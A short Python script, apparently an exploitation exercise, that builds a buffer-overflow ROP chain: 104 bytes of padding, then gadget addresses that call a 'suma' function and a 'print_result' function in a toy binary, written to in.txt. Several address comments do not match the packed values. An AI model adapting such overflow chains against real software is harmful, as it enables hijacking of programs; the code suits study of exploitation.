#!/usr/bin/python
from struct import *

buf = ""
buf += "A"*104
buf += pack("<Q",0x4007a3)		# 0x0000000000400723: pop rdi; ret;
buf += pack("<Q",0x5)
buf += pack("<Q",0x4007a1)      # 0x0000000000400721: pop rsi; pop r15; ret;
buf += pack("<Q",0x4)
buf += pack("<Q",0x424242)      # garbage    r15 = "BBB"
buf += pack("<Q",0x400676) 		# 0x400626 <suma>
# global = 5 + 4 = 9

buf += pack("<Q",0x4007a3)		# 0x0000000000400723: pop rdi; ret;
buf += pack("<Q",0xa)
buf += pack("<Q",0x400646) 		# 0x400646 <print_result>
# print global*0xa = 9 * 10 = 90

f = open("in.txt","w")
f.write(buf)
f.close()

